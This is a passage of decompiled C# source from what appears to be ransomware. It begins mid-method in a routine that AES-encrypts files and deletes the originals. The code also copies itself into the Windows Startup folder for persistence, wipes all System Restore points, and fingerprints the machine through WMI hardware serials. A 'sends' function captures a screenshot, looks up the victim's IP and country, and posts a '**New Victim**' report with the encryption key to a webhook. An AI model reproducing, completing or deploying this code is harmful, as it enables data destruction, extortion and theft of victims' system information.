						case 25:
						case 26:
							goto end_IL_0001_3;
						}
						goto default;
					}
					IL_00bb:
					num = 17;
					num5 = checked(num5 + num6);
					goto IL_00c6;
					IL_00ad:
					num = 16;
					cryptoStream.Write(buffer, 0, num6);
					goto IL_00bb;
					IL_000a:
					num = 2;
					fsInput = new FileStream(strInputFile, FileMode.Open, FileAccess.Read);
					goto IL_0019;
					IL_0019:
					num = 3;
					fsOutput = new FileStream(strOutputFile, FileMode.OpenOrCreate, FileAccess.Write);
					goto IL_0028;
					IL_0028:
					num = 4;
					fsOutput.SetLength(0L);
					goto IL_003d;
					IL_003d:
					num = 5;
					buffer = new byte[4097];
					goto IL_004a;
					IL_004a:
					num = 6;
					num5 = 0L;
					goto IL_0057;
					IL_0057:
					num = 7;
					length = fsInput.Length;
					goto IL_0065;
					IL_0065:
					num = 8;
					rijndaelManaged = new RijndaelManaged();
					goto IL_006e;
					IL_006e:
					num = 9;
					if (Direction == CryptoAction.ActionEncrypt)
					{
						goto IL_007c;
					}
					goto IL_00c6;
					IL_007c:
					num = 11;
					cryptoStream = new CryptoStream(fsOutput, rijndaelManaged.CreateEncryptor(bytKey, bytIV), CryptoStreamMode.Write);
					goto IL_00c6;
					IL_00c6:
					num = 14;
					if (num5 < length)
					{
						goto IL_0097;
					}
					goto IL_00d1;
					IL_00d1:
					num = 19;
					cryptoStream.Close();
					goto IL_00db;
					IL_00db:
					num = 20;
					fsInput.Close();
					goto IL_00e8;
					IL_00e8:
					num = 21;
					fsOutput.Close();
					goto IL_00f5;
					IL_00f5:
					num = 22;
					if (Direction != CryptoAction.ActionEncrypt)
					{
						goto end_IL_0001_3;
					}
					goto IL_00ff;
					IL_00ff:
					num = 23;
					fileInfo = new FileInfo(strInputFile);
					break;
					IL_0097:
					num = 15;
					num6 = fsInput.Read(buffer, 0, 4096);
					goto IL_00ad;
					end_IL_0001_2:
					break;
				}
				num = 24;
				fileInfo.Delete();
				break;
				end_IL_0001:;
			}
			catch (object obj) when (obj is Exception && num3 != 0 && num2 == 0)
			{
				ProjectData.SetProjectError((Exception)obj);
				try0001_dispatch = 401;
				continue;
			}
			throw ProjectData.CreateProjectError(-2146828237);
			continue;
			end_IL_0001_3:
			break;
		}
		if (num2 != 0)
		{
			ProjectData.ClearProjectError();
		}
	}

	private static byte[] CreateKey(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound2; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[32];
			int num = 0;
			do
			{
				array4[num] = array3[num];
				num++;
			}
			while (num <= 31);
			return array4;
		}
	}

	private static byte[] CreateIV(string strPassword)
	{
		char[] array = strPassword.ToCharArray();
		int upperBound = array.GetUpperBound(0);
		checked
		{
			byte[] array2 = new byte[upperBound + 1];
			int upperBound2 = array.GetUpperBound(0);
			for (int i = 0; i <= upperBound2; i++)
			{
				array2[i] = (byte)Strings.Asc(array[i]);
			}
			SHA512Managed sHA512Managed = new SHA512Managed();
			byte[] array3 = sHA512Managed.ComputeHash(array2);
			byte[] array4 = new byte[16];
			int num = 32;
			do
			{
				array4[num - 32] = array3[num];
				num++;
			}
			while (num <= 47);
			return array4;
		}
	}

	public static object startup(string filename)
	{
		object result = default(object);
		try
		{
			string text = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\" + St.mute + ".exe";
			if (File.Exists(text))
			{
				protect = new FileStream(text, FileMode.Open);
				return result;
			}
			File.Copy(filename, text);
			protect = new FileStream(text, FileMode.Open);
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	[DllImport("Srclient.dll")]
	public static extern int SRRemoveRestorePoint(int index);

	private static void DeleteRestorePoints()
	{
		//IL_000b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0015: Expected O, but got Unknown
		//IL_0010: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_002c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0032: Expected O, but got Unknown
		try
		{
			ManagementClass val = new ManagementClass("\\\\.\\root\\default", "systemrestore", new ObjectGetOptions());
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = instances.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					SRRemoveRestorePoint(Conversions.ToInteger(Conversions.ToUInteger(((ManagementBaseObject)val2).get_Item("sequencenumber")).ToString()));
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}

	public static object Bot()
	{
		try
		{
			return Operators.ConcatenateObject(Operators.ConcatenateObject(UserName(), (object)"_"), (object)HWID());
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static object UserName()
	{
		try
		{
			return Environment.UserName;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			object result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string HWID()
	{
		try
		{
			string text = Identifier("Win32_Processor", "ProcessorId");
			text = text + "-" + Identifier("Win32_BIOS", "SerialNumber");
			text = text + "-" + Identifier("Win32_BaseBoard", "SerialNumber");
			text = text + "-" + Identifier("Win32_VideoController", "Name");
			return MD5HASH(text);
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	private static string Identifier(string wmiClass, string wmiProperty)
	{
		//IL_0008: Unknown result type (might be due to invalid IL or missing references)
		//IL_000e: Expected O, but got Unknown
		//IL_0026: Unknown result type (might be due to invalid IL or missing references)
		//IL_002d: Expected O, but got Unknown
		try
		{
			string text = "";
			ManagementClass val = new ManagementClass(wmiClass);
			ManagementObjectCollection instances = val.GetInstances();
			ManagementObjectEnumerator enumerator = default(ManagementObjectEnumerator);
			try
			{
				enumerator = instances.GetEnumerator();
				while (enumerator.MoveNext())
				{
					ManagementObject val2 = (ManagementObject)enumerator.get_Current();
					if (Operators.CompareString(text, "", false) == 0)
					{
						try
						{
							text = ((ManagementBaseObject)val2).get_Item(wmiProperty).ToString();
						}
						catch (Exception projectError)
						{
							ProjectData.SetProjectError(projectError);
							ProjectData.ClearProjectError();
							continue;
						}
						break;
					}
				}
			}
			finally
			{
				((IDisposable)enumerator)?.Dispose();
			}
			return text;
		}
		catch (Exception projectError2)
		{
			ProjectData.SetProjectError(projectError2);
			string result = "Error";
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static string MD5HASH(string input)
	{
		checked
		{
			try
			{
				MD5CryptoServiceProvider mD5CryptoServiceProvider = new MD5CryptoServiceProvider();
				byte[] array = mD5CryptoServiceProvider.ComputeHash(Encoding.UTF8.GetBytes(input));
				StringBuilder stringBuilder = new StringBuilder();
				int num = array.Length - 1;
				for (int i = 10; i <= num; i++)
				{
					stringBuilder.Append(array[i].ToString("x2"));
				}
				return stringBuilder.ToString().ToUpper();
			}
			catch (Exception projectError)
			{
				ProjectData.SetProjectError(projectError);
				string result = "Error";
				ProjectData.ClearProjectError();
				return result;
			}
		}
	}

	public static bool sends(string hashh)
	{
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_001d: Expected O, but got Unknown
		bool result = default(bool);
		try
		{
			NewWebhook newWebhook = new NewWebhook(NewWebhook.webhookk);
			newWebhook._name = NewWebhook.name;
			PictureBox val = new PictureBox();
			val.set_Image((Image)(object)TakeScreenShot());
			val.get_Image().Save(Path.GetTempPath() + Environment.UserName + "-screenshot.jpg");
			WebClient webClient = new WebClient();
			string text = webClient.DownloadString("http://ip-api.com/csv/?fields=country,query");
			newWebhook.SendSysInfo(Conversions.ToString(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject(Operators.ConcatenateObject((object)("**New Victim**" + Environment.NewLine + "ID : " + hashh + Environment.NewLine + "Key : "), check.AES_Decrypttt(Interaction.GetSetting("F", "0", St.Setting, ""), HWID() + HWID())), (object)Environment.NewLine), (object)"IP : "), (object)text.Split(new char[1] { ',' })[1]), (object)"Country : "), (object)text.Split(new char[1] { ',' })[0]), (object)Environment.NewLine), (object)"OS : "), (object)((ServerComputer)MyProject.Computer).get_Info().get_OSFullName()), (object)Environment.NewLine), (object)"Date&Time : "), (object)DateTime.Now.ToString("yyyy/MM/dd HH:mm:ss"))), "Screenshot.jpg", Path.GetTempPath() + Environment.UserName + "-screenshot.jpg");
			result = true;
			return result;
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
			return result;
		}
	}

	public static Bitmap TakeScreenShot()
	{
		//IL_0067: Unknown result type (might be due to invalid IL or missing references)
		//IL_006d: Expected O, but got Unknown
		Size size = new Size(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
		Bitmap val = new Bitmap(((Computer)MyProject.Computer).get_Screen().get_Bounds().Width, ((Computer)MyProject.Computer).get_Screen().get_Bounds().Height);
		Graphics val2 = Graphics.FromImage((Image)(object)val);
		val2.CopyFromScreen(new Point(0, 0), new Point(0, 0), size);
		return val;
	}
}
